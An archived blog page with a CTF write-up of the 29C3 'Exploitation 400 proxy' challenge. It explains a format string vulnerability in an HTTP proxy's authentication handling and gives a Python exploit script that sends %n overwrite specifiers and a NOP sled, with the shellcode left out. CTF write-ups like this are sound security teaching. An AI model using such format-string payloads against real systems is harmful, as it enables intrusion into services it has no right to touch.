
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>29C3 CTF Exploitation 400 proxy - blue-lotus</title>
  <meta name="author" content="blue-lotus">

  
  <meta name="description" content="Hellok and I worked on this challenge for a quite long time. We failed to solve this challenge though, we exploit the format string vulnerability &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://www.blue-lotus.net/www/29c3-ctf-exploitation-400-proxy">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="blue-lotus" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">blue-lotus</a></h1>
  
    <h2>Security Research Team @ Tsinghua University</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="http://google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:www.blue-lotus.net/www" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">29C3 CTF Exploitation 400 Proxy</h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-01-01T00:00:00+08:00" pubdate data-updated="true">Jan 1<span>st</span>, 2013</time>
        
      </p>
    
  </header>


<div class="entry-content"><p>Hellok and I worked on this challenge for a quite long time. We failed to solve this challenge though, we exploit the format string vulnerability successfully.</p>

<p>We spent a lot of time looking for methods to bypass PAM authentication and neglect the quite obvious format string vulnerability.</p>

<p>Let&#8217;s first look at the stack layout:</p>

<p><img src="http://www.blue-lotus.net/wp-content/uploads/2013/01/proxy_stack.jpg" alt="proxy_stack" /></p>

<p>We can see the pointer &#8220;format&#8221; will be overwritten in the lowest 3 bytes.</p>

<p><img src="http://www.blue-lotus.net/wp-content/uploads/2013/01/proxy_exploit2.jpg" alt="proxy_exploit2" /></p>

<p>Format string vulnerability is here.</p>

<p><img src="http://www.blue-lotus.net/wp-content/uploads/2013/01/proxy_exploit.jpg" alt="proxy_exploit" /></p>

<p>To exploit such format string, we first get some stack address exposed using &#8220;%x&#8221; format of printf. Code for exploitation is as follows:</p>

<pre><code>import socket  
import time  
import base64  
import random  
import struct

shellcode = # We tried several 71 bytes shellcode and succeeded in our local environment 

IP = "94.45.252.240"
PORT = 1024

buf = 'GET '
buf += '/'
buf += ' HTTP/1.1'
buf += 'Authorization: Basic '
authkey=base64.b64encode('n:1')
buf += authkey
buf += "a\x78\xf7\xff\xbf\x79\xf7\xff\xbf\x7a\xf7\xff\xbf\x7b\xf7\xff\xbf"
buf += "\x90"*250
buf += shellcode
buf += "\x90"*50
buf += "%117x%165$n%253x%166$n%10x%167$n%192x%168$n"
buf += "." * (508-len(buf))
buf += "\x94\xf5"
print "*****************"
print "buf len = ", len(authkey)
print "buf len = ", len(buf)

s = socket.socket()
s.connect((IP, PORT))
s.send(buf)
print s.recv(10000)
</code></pre>

<p>We didn&#8217;t understand SECCOMP_FILTER well so we failed to execute shellcode in remote server. According to other writeups, we know that the key is hided in the cache which can be easily captured using &#8220;%s&#8221; format of printf.</p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">kelwin</span></span>

      








  


<time datetime="2013-01-01T00:00:00+08:00" pubdate data-updated="true">Jan 1<span>st</span>, 2013</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/ctf/'>CTF</a>, <a class='category' href='/blog/categories/writeup/'>writeup</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://www.blue-lotus.net/www/29c3-ctf-exploitation-400-proxy/" data-via="" data-counturl="http://www.blue-lotus.net/www/29c3-ctf-exploitation-400-proxy/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/29c3-ctf-exploitation-300-update_server/" title="Previous Post: 29C3 CTF Exploitation 300 update_server">&laquo; 29C3 CTF Exploitation 300 update_server</a>
      
      
        <a class="basic-alignment right" href="/codegate-2013-web-200/" title="Next Post: Codegate 2013 Web 200 writeup">Codegate 2013 Web 200 writeup &raquo;</a>
      
    </p>
  </footer>
</article>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/asis-ctf-finals-2013-login/">ASIS CTF Finals 2013 Login</a>
      </li>
    
      <li class="post">
        <a href="/asis-ctf-memdump-writeup/">ASIS CTF Memdump Writeup</a>
      </li>
    
      <li class="post">
        <a href="/ufo-ctf-2013-reverse-keygenme-writeup/">UFO CTF 2013 Reverse &#8211; KeyGenMe Writeup</a>
      </li>
    
      <li class="post">
        <a href="/ufoctf2013-web100-flagstore/">UFOCTF2013 Web100 FlagStore</a>
      </li>
    
      <li class="post">
        <a href="/sigint-2013-crypto300-satisfaction/">SIGINT 2013 Crypto300 Satisfaction</a>
      </li>
    
  </ul>
</section>





  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2013 - blue-lotus -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
